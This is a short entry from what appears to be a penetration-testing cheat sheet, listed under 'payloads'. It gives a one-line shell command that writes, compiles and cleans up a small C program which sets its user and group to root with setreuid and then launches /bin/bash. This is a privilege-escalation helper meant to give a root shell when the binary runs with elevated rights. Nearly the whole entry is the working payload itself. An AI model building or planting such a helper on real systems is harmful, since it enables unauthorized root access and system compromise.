# C

## payloads

### Root bash helper

Generate and compile a small C helper that sets uid/gid to 0 and starts bash.

```sh title:"Compile setreuid bash helper"
printf '%s\n' 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c; gcc pwn.c -o "$output_file"; rm pwn.c
```
<!-- cheat
var output_file := shell
-->
